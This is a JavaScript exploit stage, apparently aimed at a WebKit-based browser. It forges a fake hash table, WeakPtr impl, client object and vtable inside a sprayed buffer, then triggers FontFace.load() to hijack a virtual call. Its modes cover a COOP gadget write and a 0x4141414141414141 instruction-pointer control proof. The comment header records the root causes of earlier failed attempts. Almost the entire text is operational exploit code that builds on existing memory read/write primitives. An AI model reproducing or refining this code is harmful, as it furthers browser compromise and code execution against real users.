// V24 Patch: The V55-Faithful Dispatch (ZigZagBoi1 recipe + device corrections)
//
// ROOT CAUSES OF ALL PRIOR FAILURES (now proven from the 1400 source):
//   1. v17r HANG: real-table copy {keyCount=1, size=8} → shouldShrink()
//      = keyCount()*6 < tableSize() → 6 < 8 TRUE → shrinkToBestSize() →
//      deallocateTable() frees OUR buffer → bmalloc death → hang.
//   2. V18/V21/V22 CRASH: m_table=nullptr → removeIf → tableSize() reads
//      metadata through nullptr → SEGV.
//   3. V18B-T2/V23 CRASH: original table → real client's fontStateChanged
//      ran on the broken reclaimed face → crash inside the real handler.
//   4. v17o had a latent bug: promise at S+0x90 overlapped the fake vtable
//      at S+0xA8 (resolve/reject writes promise+0x10..0x2F → clobber).
//
// THE FIX (this probe):
//   - v16g 4-bucket table {deleted=0, keyCount=1, mask=3, size=4}:
//     shouldShrink = 1*6 < 4 = FALSE → no shrink, no rehash, no free. ✓
//   - Fake impl = byte-copy of the REAL L2 (all threading/refcount fields
//     valid), m_ptr@+0x08 patched → fake client (device-verified offset:
//     the certified walk chain reads the client at impl+0x08 every session).
//   - Fake client = byte-copy of the real wrapper (fbRaw), vtable+promise
//     patched. ref()/deref() are NON-VIRTUAL (CRTP) — the only virtual call
//     is fontStateChanged at vtable+0x18 (Layout A, confirmed).
//   - Zeroed promise placed at S+0xD0 — resolve/reject writes at
//     promise+0x10..0x2F = S+0xE0..0xFF, NO overlap with the vtable. ✓
//   - Timer region +0x88..0xBF borrowed byte-faithful from a live sibling
//     face (setStatus(Failure) unconditionally calls m_timeoutTimer.stop();
//     a zeroed timer's null m_thread trips the release assertion).
//   - fontLoadTiming() with override=Block reads ONLY +0x87 → returns
//     {infinity, 0} → Loading transition skips startOneShot. ✓
//
// MODES (?t=gadget|noop|poison, default gadget):
//   gadget: slot3 = real fontStateChanged (BASE+0x5B3D6B0). Failure
//           transition → isFulfilled(zeroed)=false → reject() → WITNESS
//           WRITE at S+0xE0..0xFF. This IS the COOP write.
//   noop:   slot3 = noop (BASE+0x4001750). Proves the full dispatch
//           infrastructure returns cleanly (status 0→1→4 via our vtable).
//   poison: slot3 = 0x4141414141414141. Classic RIP-control proof
//           (controlled crash; run AFTER gadget/noop exonerate cleanup).
//
// EXPECTED (gadget): pump → setStatus(Loading) → iterateClients →
//   removeIf (entry survives, no shrink) → Ref(fake client) →
//   fontStateChanged(Pending,Loading)=break → setStatus(Failure) →
//   fontStateChanged(Loading,Failure) → reject → WRITE → timer.stop()
//   (borrowed, valid) → LOAD-RETURNED → WIT-dispatch-WRITE beacon.

/* ==== V24: THE V55-FAITHFUL DISPATCH ==== */

try{
  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&l2raw.length>=128){
    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
    var mIdx=-1;
    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
    bs('V24-TAG-mIdx='+mIdx);

    if(mIdx>=0&&mIdx<32){
      var sv=new DataView(window.__v688.spray[mIdx]);
      var S=MBUF;
      var hitBuf=bufs[0][0];

      /* target mode */
      var TGT=(function(){var m=/[?&]t=(gadget|noop|poison)/.exec(location.search);return m?m[1]:'gadget';})();
      bs('V24-MODE='+TGT);

      /* ---- STEP 1: harvest a sibling face's Timer (ALL readAt FIRST) ---- */
      bs('V24-SIBLING-SCAN');
      var sib=0n, sibBk=0n;
      for(var sa=FB-0x2000n;sa<FB+0x2000n&&sib===0n;sa+=8n){
        var q0h=readAt(sa,8);
        if(qAt(q0h,0)===VP){
          var bkH=readAt(sa+0x10n,8);
          var bk=qAt(bkH,0);
          if(bk>0x1000000000n&&bk!==S&&bk!==FB&&bk!==self&&bk<0x10000000000n){sib=sa;sibBk=bk;}
        }
      }
      if(sibBk===0n){bs('V24-NO-SIBLING');verd('err','V24 no sibling');throw 'no sibling';}
      bs('V24-SIBLING='+hex(sib)+'-backing='+hex(sibBk));

      var timerH=readAt(sibBk+0x88n,0x38);
      bs('V24-TIMER-BORROWED='+timerH);

      /* ---- STEP 2: build the forge INSIDE the marker buffer S ----
       * S+0x00..0x1F : impl  (L2 byte-copy, m_ptr@+0x08 -> S+0x50)
       * S+0x20..0x2F : table metadata {deleted=0, keyCount=1, mask=3, size=4}
       * S+0x30..0x4F : buckets [0]=S(impl), [1..3]=0
       * S+0x50..0x8F : client (fbRaw byte-copy, vtable->S+0x90, promise->S+0xD0)
       * S+0x90..0xCF : vtable (8 slots noop, slot3@+0x18 = target)
       * S+0xD0..0xFF : zeroed promise (witness; reject writes +0x10..0x2F)
       */
      bs('V24-FORGE-BUILD');

      /* fake WeakPtrImpl: byte-copy 0x20 of the real L2, patch m_ptr@+0x08 */
      for(var ib=0;ib<0x20;ib++)sv.setUint8(ib,parseInt(l2raw.substr(ib*2,2),16));
      dvSetBig(sv,0x08,S+0x50n);

      /* table metadata at T-0x10 (T=S+0x30) */
      put32(sv,0x20,0);   /* deletedCount = 0 */
      put32(sv,0x24,1);   /* keyCount = 1 */
      put32(sv,0x28,3);   /* tableSizeMask = 3 */
      put32(sv,0x2C,4);   /* tableSize = 4  (shouldShrink: 1*6 < 4 = FALSE) */

      /* buckets */
      dvSetBig(sv,0x30,S);            /* bucket[0] = impl (S+0x00) */
      dvSetBig(sv,0x38,0n);
      dvSetBig(sv,0x40,0n);
      dvSetBig(sv,0x48,0n);

      /* fake client: byte-copy 0x40 of the real wrapper (fbRaw), patch */
      for(var cb=0;cb<0x40;cb++)sv.setUint8(0x50+cb,parseInt(fbRaw.substr(cb*2,2),16));
      dvSetBig(sv,0x50+0x00,S+0x90n);      /* client vtable -> fake */
      dvSetBig(sv,0x50+0x18,S+0xD0n);      /* client promise -> zeroed witness */

      /* fake vtable: 8 slots, slot3 (+0x18) = target */
      for(var vs=0;vs<8;vs++)dvSetBig(sv,0x90+vs*8,NOPG);
      if(TGT==='gadget')     dvSetBig(sv,0x90+0x18,FSG);
      else if(TGT==='poison')dvSetBig(sv,0x90+0x18,0x4141414141414141n);
      else                   dvSetBig(sv,0x90+0x18,NOPG);

      /* zeroed promise at S+0xD0 */
      for(var pz=0xD0;pz<0x100;pz++)sv.setUint8(pz,0);

      bs('V24-FORGE-BUILT-T='+(S+0x30n).toString(16)+'-client='+(S+0x50n).toString(16)+'-vt='+(S+0x90n).toString(16)+'-promise='+(S+0xD0n).toString(16));

      /* verify the forge via JS reads (safe: not readAt) */
      bs('V24-VERIFY-impl-m_ptr='+hex(dvGetBig(sv,0x08)));
      bs('V24-VERIFY-bucket0='+hex(dvGetBig(sv,0x30)));
      bs('V24-VERIFY-client-vt='+hex(dvGetBig(sv,0x50)));
      bs('V24-VERIFY-client-promise='+hex(dvGetBig(sv,0x50+0x18)));
      bs('V24-VERIFY-vt-slot3='+hex(dvGetBig(sv,0x90+0x18)));

      /* witness baseline AFTER craft (diff = engine writes only) */
      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));

      /* ---- STEP 3: craft the FACE (hitBuf) — all readAt done ---- */
      bs('V24-FACE-CRAFT');
      for(var sz=0x28;sz<=0x47;sz++)hitBuf[sz]=0;      /* sources empty */
      hitBuf[0x82]=0;                                  /* status = Pending */
      hitBuf[0x83]=1;                                  /* sourcesPopulated */
      hitBuf[0x87]=1;                                  /* override = Block */
      for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;      /* blanket bools */
      for(var tb=0;tb<0x38;tb++)hitBuf[0x88+tb]=parseInt(timerH.substr(tb*2,2),16); /* borrowed timer */
      bs('V24-FACE-VERIFY-status='+hitBuf[0x82]+'-override='+hitBuf[0x87]+'-timer88='+hitBuf.slice(0x88,0x90).map(function(x){return x.toString(16);}).join(','));

      /* ---- STEP 4: install the table pointer — the LAST write ---- */
      for(var hb=0;hb<8;hb++)hitBuf[0x58+hb]=Number(((S+0x30n)>>BigInt(hb*8))&0xFFn);
      bs('V24-INSTALLED-tblPtr='+hex(S+0x30n));

      /* ---- STEP 5: THE DISPATCH ---- */
      bs('V24-LOAD-PRE');
      var loadReturned=false;
      try{
        faces[zi].load();
        loadReturned=true;
        bs('V24-LOAD-RETURNED');
      }catch(e){
        bs('V24-LOAD-THREW-'+String(e&&e.message?e.message:'?'));
      }

      bs('V24-POST-returned='+loadReturned);
      bs('V24-STATUS-AFTER='+hitBuf[0x82]);
      try{bs('V24-JS-STATUS='+faces[zi].status);}catch(e){bs('V24-JS-STATUS-ERR');}

      /* witness diff: the reject write lands at S+0xE0..0xFF */
      var curA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));
      var diffs=[];
      for(var wq=0;wq<0x100;wq+=8){
        var cur=0n,old=0n;
        for(var wb=0;wb<8;wb++){
          cur|=BigInt(curA[wq+wb])<<BigInt(wb*8);
          old|=BigInt(preA[wq+wb])<<BigInt(wb*8);
        }
        if(cur!==old)diffs.push('@'+(S+BigInt(wq)).toString(16)+':'+old.toString(16)+'>'+cur.toString(16));
      }
      if(diffs.length)bs('WIT-V24-DISPATCH-WRITE-'+diffs.slice(0,10).join('|'));
      else bs('WIT-V24-nowrite');

      /* restore the face's original table pointer */
      for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
      bs('V24-RESTORED');

      if(loadReturned){
        verd('ok','V24 '+TGT+' load() RETURNED');
        bs('V24-DONE-'+TGT+'-RETURNED');
      }else{
        verd('err','V24 '+TGT+' crashed');
        bs('V24-DONE-'+TGT+'-CRASHED');
      }

    }else bs('V24-SKIP-bad-idx');
  }else bs('V24-SKIP-missing-data');
}catch(e24){bs('V24-ERR-'+String(e24&&e24.message?e24.message:'?'));}
/* ==== V24 END ==== */
